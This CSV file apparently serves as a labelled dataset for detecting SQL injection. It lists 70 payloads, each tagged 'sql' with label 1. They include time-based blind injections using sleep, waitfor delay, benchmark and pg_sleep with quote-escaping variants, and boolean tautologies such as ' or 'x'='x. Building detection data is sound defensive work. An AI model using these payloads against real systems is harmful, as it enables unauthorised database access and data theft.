index,input,category,labels
0,"# from wapiti
",sql,1
1,"sleep(__TIME__)#
",sql,1
2,"1 or sleep(__TIME__)#
",sql,1
3,""" or sleep(__TIME__)#
",sql,1
4,"' or sleep(__TIME__)#
",sql,1
5,""" or sleep(__TIME__)=""
",sql,1
6,"' or sleep(__TIME__)='
",sql,1
7,"1) or sleep(__TIME__)#
",sql,1
8,""") or sleep(__TIME__)=""
",sql,1
9,"') or sleep(__TIME__)='
",sql,1
10,"1)) or sleep(__TIME__)#
",sql,1
11,""")) or sleep(__TIME__)=""
",sql,1
12,"')) or sleep(__TIME__)='
",sql,1
13,";waitfor delay '0:0:__TIME__'--
",sql,1
14,");waitfor delay '0:0:__TIME__'--
",sql,1
15,"';waitfor delay '0:0:__TIME__'--
",sql,1
16,""";waitfor delay '0:0:__TIME__'--
",sql,1
17,"');waitfor delay '0:0:__TIME__'--
",sql,1
18,""");waitfor delay '0:0:__TIME__'--
",sql,1
19,"));waitfor delay '0:0:__TIME__'--
",sql,1
20,"'));waitfor delay '0:0:__TIME__'--
",sql,1
21,"""));waitfor delay '0:0:__TIME__'--
",sql,1
22,"benchmark(10000000,MD5(1))#
",sql,1
23,"1 or benchmark(10000000,MD5(1))#
",sql,1
24,""" or benchmark(10000000,MD5(1))#
",sql,1
25,"' or benchmark(10000000,MD5(1))#
",sql,1
26,"1) or benchmark(10000000,MD5(1))#
",sql,1
27,""") or benchmark(10000000,MD5(1))#
",sql,1
28,"') or benchmark(10000000,MD5(1))#
",sql,1
29,"1)) or benchmark(10000000,MD5(1))#
",sql,1
30,""")) or benchmark(10000000,MD5(1))#
",sql,1
31,"')) or benchmark(10000000,MD5(1))#
",sql,1
32,"pg_sleep(__TIME__)--
",sql,1
33,"1 or pg_sleep(__TIME__)--
",sql,1
34,""" or pg_sleep(__TIME__)--
",sql,1
35,"' or pg_sleep(__TIME__)--
",sql,1
36,"1) or pg_sleep(__TIME__)--
",sql,1
37,""") or pg_sleep(__TIME__)--
",sql,1
38,"') or pg_sleep(__TIME__)--
",sql,1
39,"1)) or pg_sleep(__TIME__)--
",sql,1
40,""")) or pg_sleep(__TIME__)--
",sql,1
41,"')) or pg_sleep(__TIME__)--
",sql,1
42,"'-'
",sql,1
43,"' '
",sql,1
44,"'&'
",sql,1
45,"'^'
",sql,1
46,"'*'
",sql,1
47,"' or ''-'
",sql,1
48,"' or '' '
",sql,1
49,"' or ''&'
",sql,1
50,"' or ''^'
",sql,1
51,"' or ''*'
",sql,1
52,"""-""
",sql,1
53,""" ""
",sql,1
54,"""&""
",sql,1
55,"""^""
",sql,1
56,"""*""
",sql,1
57,""" or """"-""
",sql,1
58,""" or """" ""
",sql,1
59,""" or """"&""
",sql,1
60,""" or """"^""
",sql,1
61,""" or """"*""
",sql,1
62,"or true--
",sql,1
63,""" or true--
",sql,1
64,"' or true--
",sql,1
65,""") or true--
",sql,1
66,"') or true--
",sql,1
67,"' or 'x'='x
",sql,1
68,"') or ('x')=('x
",sql,1
69,"')) or (('x'))=(('x
",sql,1
